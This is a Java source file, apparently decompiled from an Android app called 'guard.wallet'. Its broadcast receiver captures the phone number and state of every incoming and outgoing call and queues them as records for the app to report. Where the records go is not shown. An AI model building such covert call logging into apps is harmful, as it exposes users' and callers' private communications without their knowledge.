package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.CallMessageVO;

/**
 * vendor CallReceiver — detects incoming/outgoing calls and reports state changes.
 */
public class CallReceiver extends BroadcastReceiver {
    public Integer a = 0;

    @Override
    public final void onReceive(Context var1, Intent var2) {
        try {
            this.a = 1;

            byte callType;
            String intentCode;
            String phoneNumber;

            if ("android.intent.action.NEW_OUTGOING_CALL".equals(var2.getAction())) {
                // Outgoing call
                callType = 0;
                phoneNumber = var2.getStringExtra("android.intent.extra.PHONE_NUMBER");
                intentCode = "android.intent.action.NEW_OUTGOING_CALL";
            } else {
                // Incoming call / phone state change
                callType = 1;
                phoneNumber = var2.getStringExtra("incoming_number");
                intentCode = "android.intent.action.PHONE_STATE";
            }

            TelephonyManager tm = (TelephonyManager) var1.getSystemService("phone");

            String callState = null;
            if (tm != null) {
                int state = tm.getCallState();
                if (state == 0) {
                    Log.d("CallReceiver", "电话挂断...");
                    callState = "CALL_STATE_IDLE";
                } else if (state == 1) {
                    Log.d("CallReceiver", "电话响铃中...");
                    callState = "CALL_STATE_RINGING";
                } else if (state == 2) {
                    Log.d("CallReceiver", "电话接通中...");
                    callState = "CALL_STATE_OFFHOOK";
                }
            }

            CallMessageVO callVO = new CallMessageVO(Integer.valueOf(callType), phoneNumber, callState);
            if (!AppUtils.B(intentCode)) {
                MessageRecordVO record = new MessageRecordVO();
                record.setExtraBody(callVO);
                record.setIntentCode(intentCode);
                MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
            }
        } catch (Exception var16) {
            AppUtils.s("CallReceiver", var16);
        }
    }
}
